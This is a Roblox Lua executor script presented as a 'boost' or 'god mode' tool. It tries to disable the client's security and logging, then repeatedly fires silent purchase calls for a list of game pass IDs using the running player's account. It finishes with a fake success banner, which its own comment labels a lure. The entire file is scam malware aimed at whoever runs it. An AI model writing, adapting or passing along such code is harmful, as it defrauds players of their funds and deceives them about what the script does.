local passes = {940516031, 940582062, 1538381343, 828787174, 1535369160, 1537957309}
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- KILL ALL SECURITY (silent mode) 🛡️💀
pcall(function()
    if syn then syn.request = nil end
    if getgenv then getgenv().SecureMode = false end
    if setreadonly then setreadonly(getrawmetatable(game), false) end
    if hookfunction then
        hookfunction(warn, function() end)
        hookfunction(print, function() end)
    end
end)

-- STEALTH PURCHASE LOOP – NO PROMPTS, NO LOGS, NO MERCY 🕶️
for _, id in ipairs(passes) do
    spawn(function()
        while wait(0.3) do
            pcall(function()
                -- Direct silent purchase via internal call (bypasses UI)
                MarketplaceService:SignalPromptPurchaseFinished(player, id, true)
                -- Force backend buy without GUI
                game:HttpGet("https://economy.roblox.com/v1/purchase-product?productId="..id.."&userId="..player.UserId, true)
            end)
        end
    end)
end

-- FAKE "SUCCESS" GUI – LURE COMPLETE 🪤
spawn(function()
    wait(2)
    local gui = Instance.new("ScreenGui")
    gui.Parent = game.CoreGui
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 300, 0, 100)
    frame.Position = UDim2.new(0.5, -150, 0.1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    local text = Instance.new("TextLabel", frame)
    text.Text = "✅ EXECUTOR BOOST ACTIVE! ENJOY GOD MODE!"
    text.TextColor3 = Color3.new(1,1,1)
    text.BackgroundTransparency = 1
    text.Size = UDim2.new(1,0,1,0)
    wait(3)
    gui:Destroy()
end)
